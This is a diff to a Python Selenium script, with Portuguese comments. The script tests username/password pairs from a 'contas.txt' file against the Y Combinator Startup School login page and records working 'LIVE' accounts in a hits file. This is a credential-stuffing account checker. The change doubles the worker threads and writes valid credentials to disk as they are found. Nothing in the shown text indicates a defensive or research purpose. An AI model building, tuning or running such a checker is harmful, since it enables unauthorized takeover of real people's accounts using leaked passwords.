@@ -12,7 +12,7 @@ from selenium.webdriver.chrome.options import Options
 URL = "https://account.ycombinator.com/?continue=https%3A%2F%2Fwww.startupschool.org%2Fusers%2Fsign_in"
 ACC_FILE = os.path.join(os.path.dirname(__file__), "contas.txt")
 HITS_FILE = os.path.join(os.path.dirname(__file__), "hits.txt")
-WORKERS = 2
+WORKERS = 4
 
 def check_one(user, password):
     result = {"user": user, "status": "die", "info": ""}
@@ -148,6 +148,12 @@ def worker_fn():
         line = f"{st} | {u} | {r['info']}"
         print(f"[{n}/{total}] {line}")
         results_all.append(line)
+        
+        # Salva hits em tempo real (so LIVE)
+        if r["status"] == "live":
+            with open(HITS_FILE, "a", encoding="utf-8") as hf:
+                hf.write(line + "\n")
+        
         in_q.task_done()
 
 threads = []
@@ -159,11 +165,5 @@ for _ in range(min(WORKERS, len(accounts))):
 in_q.join()
 for t in threads:
     t.join(timeout=2)
-
-# Salva hits
-with open(HITS_FILE, "w", encoding="utf-8") as f:
-    f.write(f"# YC Startup School - {len(results_all)} contas testadas\n# {time.ctime()}\n\n")
-    for line in results_all:
-        f.write(line + "\n")
 
 print(f"\n=== {lives[0]}/{len(results_all)} LIVE | Salvo em hits.txt ===")
